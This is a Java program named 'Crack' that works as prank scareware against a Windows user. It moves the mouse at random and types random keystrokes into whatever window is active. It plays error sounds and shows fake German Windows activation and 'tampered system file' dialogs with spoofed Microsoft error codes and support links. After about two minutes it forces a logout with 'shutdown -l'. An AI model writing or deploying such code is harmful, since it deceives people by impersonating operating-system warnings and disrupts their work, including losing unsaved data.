package Crack;

import java.awt.AWTException;
//import java.awt.Frame;
import java.awt.MouseInfo;
import java.awt.Robot;
import java.awt.event.KeyEvent;
import java.awt.Toolkit;
import java.io.IOException;

//import javax.swing.ImageIcon;
import javax.swing.JOptionPane;
import javax.swing.JFrame;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.GregorianCalendar;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;


public class Crack {
	
	private static String cLogOut = "shutdown -l";
	
	private static Process cChild = null;
	
	private static long cTimeToStopThreads = System.currentTimeMillis() / 1000;
	
	/*
	 * Feste Werte weil wir die Logout Zeit randomisieren und schließlich wollen, dass die Funktionen
	 * solange laufen bis die Abbruchbedingung, das heißt der Rechner sich abmeldet!
	 */
	
	private static long cTimeToStopThreadCR1 = 120;
	
	private static long cTimeToStopThreadCR2 = 120;
	
	private static long cTimeToStopThreadCR3 = 120;
	
	private static long cTimeToStopThreadCR4 = 120;
	
	private static long cTimeToLogOut = 120;//ThreadLocalRandom.current().nextLong(130);
	
	private static boolean cTimeToStop;
	
	//private static long cSystemTime = System.currentTimeMillis() / 1000;

	// public static Random myRandom = new Random();

	// private static boolean changeThread = false;
	
	//private static boolean threadStart1 = false;
	
	//private static boolean threadStart2 = false;
	
	//private static boolean threadStart3 = false;
	
	//private static boolean threadStart4 = false;

	// private static Console javaConsole = System.console();

	/*
	 * public int[] cIN = {33,34,35,36,37,38};
	 * 
	 * public void cNOut(int[] pCIN){ this.cIN = Arrays.copyOf(cIN, cRN); //new
	 * Random().nextInt(); }
	 * 
	 * public int getRN(){ return
	 * ThreadLocalRandom.current().nextInt(cIN.length); }
	 */

	private static Runnable cR1 = new Runnable() {

		@Override
		public void run() {

			//System.out.println("My First Thread started!");

			int cR1moveX = 0;
			int cR1moveY = 0;
			final int cR1min = 11;
			final int cR1max = 20;

			try {
				Robot cRT1 = new Robot();
				int cLoop = 1;
				for(long i = 0; i < cLoop; ++i){//while (true) {
					cR1moveX = (int) (((Math.random() * cR1max) + 1) - cR1min);
					cR1moveY = (int) (((Math.random() * cR1max) + 1) - cR1min);
					cRT1.mouseMove(MouseInfo.getPointerInfo().getLocation().x + cR1moveX, MouseInfo.getPointerInfo().getLocation().y + cR1moveY);
					/*
					 * int cR1mouseX =
					 * MouseInfo.getPointerInfo().getLocation().x; int cR1mouseY
					 * = MouseInfo.getPointerInfo().getLocation().y;
					 * System.out.println("x: " + cR1mouseX);
					 * System.out.println("y: " + cR1mouseY);
					 */
					//threadStart1 = true;
					cLoop++;
					Thread.sleep(25);
					if(cTimeToStopThreadCR1 < (System.currentTimeMillis() / 1000) - cTimeToStopThreads || cTimeToStop == false){
						cLoop = 0;
					}
				}
			} catch (InterruptedException | AWTException IE) {
				IE.printStackTrace();
			}
		}
	};

	private static Runnable cR2 = new Runnable() {

		@Override
		public void run() {
			
			final int cR2Min1 = 65;
			final int cR2Max1 = 90;
			final int cR2Min2 = 96;
			final int cR2Max2 = 111;
			boolean cMF = false;
			
			try {
				Robot cRT2 = new Robot();
				int cLoop = 1;
				for(long i = 0; i < cLoop; ++i){//while (true) {
					cMF = (new Random().nextInt(20) % (new Random().nextInt(5) + 1)) == 0;
					int cR2Random = ThreadLocalRandom.current().nextInt(0,1 + 1);
					if (cR2Random < 1 && cMF == true) {
						cRT2.keyPress(KeyEvent.VK_SHIFT);
						cRT2.keyPress(ThreadLocalRandom.current().nextInt(cR2Min1, cR2Max1 + 1));
						cRT2.keyRelease(KeyEvent.VK_SHIFT);
						//threadStart2 = true;
						/*if (ThreadLocalRandom.current().nextInt(100000) > 9975){
							cRT2.keyPress(KeyEvent.VK_ENTER);
							cRT2.keyRelease(KeyEvent.VK_ENTER);
						}*/
					} else if (cR2Random < 1 && cMF == false) {
						cRT2.keyPress(ThreadLocalRandom.current().nextInt(
								cR2Min1, cR2Max1 + 1));
						//threadStart2 = true;
					}
					if (cR2Random < 2 && cR2Random > 0) {
						cRT2.keyPress(ThreadLocalRandom.current().nextInt(
								cR2Min2, cR2Max2 + 1));
						//threadStart2 = true;
					}
					cLoop++;
					Thread.sleep(ThreadLocalRandom.current().nextLong(1000));
					if(cTimeToStopThreadCR2 < (System.currentTimeMillis() / 1000) - cTimeToStopThreads || cTimeToStop == false){
						cLoop = 0;
					}
				}
			} catch (InterruptedException | AWTException IE) {
				IE.printStackTrace();
			}
		}
			//System.out.println("My Second Thread started!");
	};

	private static Runnable cR3 = new Runnable() {

		@Override
		public void run() {

			//System.out.println("My Third Thread started!");

			try {
				Runnable winSound1 = (Runnable)Toolkit.getDefaultToolkit().getDesktopProperty("win.sound.default");
				Runnable winSound2 = (Runnable)Toolkit.getDefaultToolkit().getDesktopProperty("win.sound.hand");
				int cLoop = 1;
				for(long i = 0; i < cLoop; ++i){//while (true) {
					if(new Random().nextInt(10000) < 1250){
						winSound1.run();
						//threadStart3 = true;
					}
					if(new Random().nextInt(10000) > 9500){
						winSound2.run();
						//threadStart3 = true;
					}
					cLoop++;
					Thread.sleep(ThreadLocalRandom.current().nextLong(2000));
					if(cTimeToStopThreadCR3 < (System.currentTimeMillis() / 1000) - cTimeToStopThreads || cTimeToStop == false){
						cLoop = 0;
					}
					//Thread.sleep(2000);
				}
			} catch (InterruptedException IE) {
				IE.printStackTrace();
			}
		}
	};

	private static Runnable cR4 = new Runnable() {

		@Override
		public void run() {

			//System.out.println("My Fourth Thread started!");
			
			try {
				UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
			} catch (ClassNotFoundException | InstantiationException | IllegalAccessException | UnsupportedLookAndFeelException e) {
				e.printStackTrace();
			}
			
			try {
				JFrame cFrame = new JFrame();
				Calendar cCalendar = new GregorianCalendar();
				DateFormat cDF = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
				cDF.setCalendar(cCalendar);
				cCalendar.add(Calendar.DAY_OF_MONTH, ThreadLocalRandom.current().nextInt(0, 30 + 1));
				cCalendar.add(Calendar.HOUR, ThreadLocalRandom.current().nextInt(0, 24 + 1));
				cCalendar.add(Calendar.MINUTE, ThreadLocalRandom.current().nextInt(0, 60 + 1));
				//Date cCD = Calendar.getInstance().getTime();
				String cRequestDate = cDF.format(cCalendar.getTime());
				//String cSFURL = "https://support.microsoft.com/de-de";
				
				int cLoop = 1;
				for(long i = 0; i < cLoop; ++i){//while (true) {
					if(new Random().nextInt(5000) <= 200){
						int cR4Random1 = ThreadLocalRandom.current().nextInt(0,3 + 1);
						int cR4Random2 = ThreadLocalRandom.current().nextInt(0,3 + 1);
						//int cDialogOption = 0;
						//cDialogOption = JOptionPane.showConfirmDialog(frame, "bla", "Windows Features", cDialogOption);
						switch(cR4Random1){
						case 0:
							switch(cR4Random2){
							case 0:
								JOptionPane.showMessageDialog(cFrame, "Der eingegebene Lizenzschlüssel wird schon auf einem anderen Computer verwendet!", "Fehlercode 0xC004C008", JOptionPane.ERROR_MESSAGE, null);
								break;
							case 1:
								JOptionPane.showMessageDialog(cFrame, "Bei der Echtheitsüberprüfung wurden manipulierte Windows-Binärdateien erkannt.", "Fehlercode 0xC004C4AE", JOptionPane.ERROR_MESSAGE, null);
								break;
							case 2:
								JOptionPane.showMessageDialog(cFrame, "Während der Aktivierung dieser Windows-Kopie ist ein Netzwerkproblem aufgetreten.", "Fehlercode 0xC004FC03", JOptionPane.ERROR_MESSAGE, null);
								break;
							case 3:
								JOptionPane.showMessageDialog(cFrame, "Unbekannter Fehler.", "Fehlercode 0x80004005", JOptionPane.ERROR_MESSAGE, null);
								break;
							}
							//threadStart4 = true;
							break;
						case 1:
							if(JOptionPane.showConfirmDialog(cFrame, "<html>Falls Sie die Windows Suche deaktivieren, hat dies Auswirkungen <br/> auf die Windows Features und installierten Programme, <br/> sowie die Standardeinstellungen. <br/> Sind Sie sicher, dass Sie fortfahren wollen? <br/> <a href=\"https://support.microsoft.com/de-de/\">Besuchen Sie die Supportseite für mehr Informationen</a></html>", "Windows Features", JOptionPane.YES_NO_OPTION) == JOptionPane.YES_OPTION){
								JOptionPane.showMessageDialog(cFrame, "Bei der Echtheitsüberprüfung wurden manipulierte Windows-Binärdateien erkannt.", "Fehlercode 0xC004C4AE", JOptionPane.ERROR_MESSAGE, null);
								//threadStart4 = true;
								break;
							}
							else //if(JOptionPane.showConfirmDialog(frame, "<html>Falls Sie die Windows Suche deaktivieren, hat dies Auswirkungen <br/> auf die Windows Features und installierten Programme, <br/> sowie die Standardeinstellungen. <br/> Sind Sie sicher, dass Sie fortfahren wollen? <br/> <a href=\"https://support.microsoft.com/de-de/\">Besuchen Sie die Supportseite für mehr Informationen</a></html>", "Windows Features", JOptionPane.YES_NO_OPTION) == JOptionPane.NO_OPTION)
							{
								JOptionPane.showMessageDialog(cFrame, "Unbekannter Fehler.", "Fehlercode 0x80004005", JOptionPane.ERROR_MESSAGE, null);
								//threadStart4 = true;
								break;
							}
						case 2:
							JOptionPane.showMessageDialog(cFrame, "<html>Der Support für Windows 10 wird am " + cRequestDate + " eingestellt. <br/> <a href=\"https://support.microsoft.com/de-de/\">Klicken Sie hier</a> um weitere Informationen zu erhalten.</html>", "Windows", JOptionPane.WARNING_MESSAGE, null);
							//threadStart4 = true;
							break;
						case 3:
							JOptionPane.showConfirmDialog(cFrame, "<html>Sind Sie sicher das Sie den Popup Blocker vom Internet Explorer deaktivieren wollen?</html>", "Popup Blocker", JOptionPane.YES_NO_OPTION); //JOptionPane.showMessageDialog(frame, "Unbekannter Fehler.", "Fehlercode 0x80004005", JOptionPane.INFORMATION_MESSAGE, null);
							//threadStart4 = true;
							break;
						}
					}
					/*
					if(new Random().nextInt(5000) <= 100){	
						switch(cR2Random){
							case 0:
								JOptionPane.showMessageDialog(frame, "Der eingegebene Lizenzschlüssel wird schon auf einem anderen Computer verwendet!", "Fehlercode 0xC004C008", JOptionPane.ERROR_MESSAGE, null);
								break;
							case 1:
								JOptionPane.showMessageDialog(frame, "Bei der Echtheitsüberprüfung wurden manipulierte Windows-Binärdateien erkannt.", "Fehlercode 0xC004C4AE", JOptionPane.ERROR_MESSAGE, null);
								break;
							case 2:
								JOptionPane.showMessageDialog(frame, "Während der Aktivierung dieser Windows-Kopie ist ein Netzwerkproblem aufgetreten.", "Fehlercode 0xC004FC03", JOptionPane.ERROR_MESSAGE, null);
								break;
							case 3:
								JOptionPane.showMessageDialog(frame, "Unbekannter Fehler.", "Fehlercode 0x80004005", JOptionPane.ERROR_MESSAGE, null);
								break;
						}
					}*/
					
					

					/*if(new Random().nextInt(5000) <= 100){
						if(cR2Random == 0){
							JOptionPane.showMessageDialog(frame, "Der eingegebene Lizenzschlüssel wird schon auf einem anderen Computer verwendet!", "Fehlercode 0xC004C008", JOptionPane.ERROR_MESSAGE, null);
						}
						if(cR2Random == 1){
							JOptionPane.showMessageDialog(frame, "Bei der Echtheitsüberprüfung wurden manipulierte Windows-Binärdateien erkannt.", "Fehlercode 0xC004C4AE", JOptionPane.ERROR_MESSAGE, null);
						}
						if(cR2Random == 2){
							JOptionPane.showMessageDialog(frame, "Während der Aktivierung dieser Windows-Kopie ist ein Netzwerkproblem aufgetreten.", "Fehlercode 0xC004FC03", JOptionPane.ERROR_MESSAGE, null);
						}
						if(cR2Random == 3){
							JOptionPane.showMessageDialog(frame, "Unbekannter Fehler.", "Fehlercode 0x80004005", JOptionPane.ERROR_MESSAGE, null);
						}
					}
					if(new Random().nextInt(5000) > 4950){
						JOptionPane.showMessageDialog(frame, "Unbekannter Fehler.", "Fehlercode 0x80004005", JOptionPane.QUESTION_MESSAGE, null);
					}
					if(new Random().nextInt(10000) < 200 & new Random().nextInt(10000) > 124){
						JOptionPane.showMessageDialog(frame, "<html>Der Support für Windows 10 wird am " + cRequestDate + " eingestellt. <br/> <a href=\"https://support.microsoft.com/de-de/\">Klicken Sie hier</a> um weitere Informationen zu erhalten.</html>", "Windows", JOptionPane.WARNING_MESSAGE, null);
					}
					if(new Random().nextInt(10000) > 9925){
						JOptionPane.showMessageDialog(frame, "Unbekannter Fehler.", "Fehlercode 0x80004005", JOptionPane.INFORMATION_MESSAGE, null);
					}*/
					cLoop++;
					Thread.sleep(2000);
					if(cTimeToStopThreadCR4 < (System.currentTimeMillis() / 1000) - cTimeToStopThreads || cTimeToStop == false){
						cLoop = 0;
					}
				}
			} catch (InterruptedException IE) {
				IE.printStackTrace();
			}
		}
	};
	
	/*private static Runnable cR5 = new Runnable() {

		@Override
		public void run() {
			if(threadStart1 == true && threadStart2 == true && threadStart3 == true && threadStart4 == true){
				try {
					Thread.sleep(30000);
				} catch (InterruptedException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
				
				JFrame cFrame = new JFrame("CrackFrameError!");
				cFrame.setUndecorated(true);
				cFrame.setAlwaysOnTop(true);
				cFrame.setResizable(false);
				
				try {
					cFrame.add(new Component() {
						BufferedImage img = ImageIO.read(new File("src/critical_corruption_Win_10.png"));
					    
						@Override
					    public void paint(Graphics g) {
					        super.paint(g);
					        g.drawImage(img, 0, 0, getWidth(), getHeight(), this);
					    }
					});
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			    GraphicsEnvironment cGE = GraphicsEnvironment.getLocalGraphicsEnvironment();
			    GraphicsDevice cGS = cGE.getDefaultScreenDevice();
			    cGS.setFullScreenWindow(cFrame);
			    cFrame.validate();
			}
		}
	};*/

	public static Process getcChild() {
		return cChild;
	}

	public static void setcChild(Process cChild) {
		Crack.cChild = cChild;
	}

	public static void main(String[] args) {
		// System.out.println("Lets Test the Program!");
		// PrintWriter bla = javaConsole.writer();

		/*
		 * CrackThread1 myFirstThread = new CrackThread1();
		 * 
		 * CrackThread2 mySecondThread = new CrackThread2();
		 * 
		 * myFirstThread.run(); mySecondThread.run();
		 */

		// char myChar = 'z';
		/*
		 * char myChar = '9'; int i = (int) myChar; // cast from a char to an
		 * int
		 * 
		 * System.out.println ("ASCII value - " + i);
		 */

		Thread myCrackThread1 = new Thread(cR1);
		Thread myCrackThread2 = new Thread(cR2);
		Thread myCrackThread3 = new Thread(cR3);
		Thread myCrackThread4 = new Thread(cR4);
		//Thread myCrackThread5 = new Thread(cR5);
		
		myCrackThread1.start();
		myCrackThread2.start();
		myCrackThread3.start();
		myCrackThread4.start();
		//myCrackThread5.start();
		
		long cLoop = 1;
		for(long i = 0; i < cLoop; ++i){
			if(cLoop > 0){
				cTimeToStop = true;
			}
			cLoop++;
			if(cTimeToLogOut < (System.currentTimeMillis() / 1000) - cTimeToStopThreads){
				cTimeToStop = false;
				cLoop = 0;
			}
			//System.out.println("Boolescher Wert: " + cTimeToStop);
		}
			//setcChild(Runtime.getRuntime().exec(cLogOut));
		try {
			if(cTimeToStop == false){
				setcChild(Runtime.getRuntime().exec(cLogOut));
			}
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
		}
		/*myCrackThread5.start();
		if(myCrackThread5.isAlive()){
			myCrackThread1.interrupt();
			myCrackThread2.interrupt();
			myCrackThread3.interrupt();
			myCrackThread4.interrupt();
		}*/
	}
}